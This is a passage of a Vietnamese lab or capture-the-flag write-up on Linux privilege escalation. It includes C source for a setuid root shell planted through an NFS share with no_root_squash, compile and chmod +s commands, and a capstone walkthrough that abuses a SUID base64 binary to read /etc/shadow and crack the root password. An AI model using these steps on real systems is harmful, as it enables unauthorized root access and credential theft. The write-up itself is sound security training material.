Tạo một file C đơn giản có chức năng thực thi `/bin/bash` dưới quyền root:

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    setgid(0);
    setuid(0);
    system("/bin/bash");
    return 0;
}
```

Biên dịch payload ngay trong thư mục mount:

```bash
nano nfs.c
gcc nfs.c -o nfs
chmod +s nfs
```

File `nfs` giờ đã có SUID và thuộc về root vì NFS không squash quyền root.

***

#### 4. Thực thi trên máy victim

Trên máy victim, kiểm tra thư mục chia sẻ:

```bash
cd /home/ubuntu/sharedfolder
ls -l nfs
```

Kết quả:

```
-rwsrwsr-x 1 root root 16056 Aug 6 07:04 nfs
```

Thực thi file:

```bash
./nfs
whoami
```

Kết quả:

```
root
```



## XI . Capstone Challenge

<figure><img src="../.gitbook/assets/image (452).png" alt=""><figcaption></figcaption></figure>



Đầu tiên ta sẽ tiến hành recon . Sau khi tôi thử từng loại  leo quyền đã được học bên trên , và tôi dừng lại ở phần `SUID`&#x20;

Sau khi đối chiếu với [link](https://gtfobins.github.io/#+suid) thì tôi đã tìm được phương án để có thể leo quyền

<figure><img src="../.gitbook/assets/image (445).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (451).png" alt=""><figcaption></figcaption></figure>

MỤC ĐÍCH : Ta sẽ lợi dụng chương trình `base64` khi được gán SUID để **đọc tệp hệ thống** mà người dùng thường không có quyền truy cập (như `/etc/shadow`).



Và tôi nhận thấy mật khẩu của root đã bị mã hóa bởi 1 hàm băm , đến đây ta có thể sử dụng `hashcat` ...&#x20;

Nhưng ở đây để tiếp kiệm thời gian thì tôi sẽ ưu tiên sử dụng :

`hashes - 1 công cụ tích hợp sẵn ở trên web để xử lý mã băm`&#x20;

<figure><img src="../.gitbook/assets/image (447).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../.gitbook/assets/image (448).png" alt=""><figcaption></figcaption></figure>

Sau khi có được mật khẩu , thì ta sẽ tiến hành đăng nhập vào tài khoản `root`



<figure><img src="../.gitbook/assets/image (449).png" alt=""><figcaption></figcaption></figure>

Đến đây thì dễ rồi chúng ta chỉ cần tìm vị trí của 2 file flag và đọc thôi :3&#x20;



<figure><img src="../.gitbook/assets/image (450).png" alt=""><figcaption></figcaption></figure>



